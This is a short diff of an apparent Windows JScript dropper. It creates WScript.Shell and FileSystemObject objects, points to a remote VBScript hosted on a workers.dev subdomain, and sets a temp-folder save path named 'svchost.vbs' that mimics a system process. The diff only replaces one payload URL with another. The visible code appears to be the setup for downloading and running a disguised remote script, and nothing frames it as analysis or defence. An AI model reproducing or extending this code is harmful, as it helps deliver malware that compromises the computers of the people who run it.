@@ -1,7 +1,7 @@
 var shell = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 
-var url = "https://delicate-art-f79b.aledreamer1234.workers.dev/ccc.vbs";
+var url = "https://broad-waterfall-4c53.aledreamer1234.workers.dev/555.vbs";
 var path = fso.GetSpecialFolder(2) + "\\svchost.vbs";
 
 var log = fso.CreateTextFile(fso.GetSpecialFolder(2) + "\\js_test.log", true);
